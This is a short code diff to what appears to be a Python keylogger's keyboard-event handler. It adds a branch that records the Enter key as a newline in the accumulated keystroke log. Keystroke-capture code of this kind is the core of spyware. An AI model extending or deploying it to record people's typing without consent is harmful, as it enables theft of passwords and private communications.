@@ -226,6 +226,8 @@ def OnKeyboardEvent(event):
             strLogs = strLogs + " [BckSpace] "
     elif event.Ascii == 9:
         strLogs = strLogs + " [Tab] "
+    elif event.Ascii == 13:
+        strLogs = strLogs + "\n"
     elif event.Ascii == 0:  # if the key is a special key such as alt, win, etc. Pass
         pass
     else:
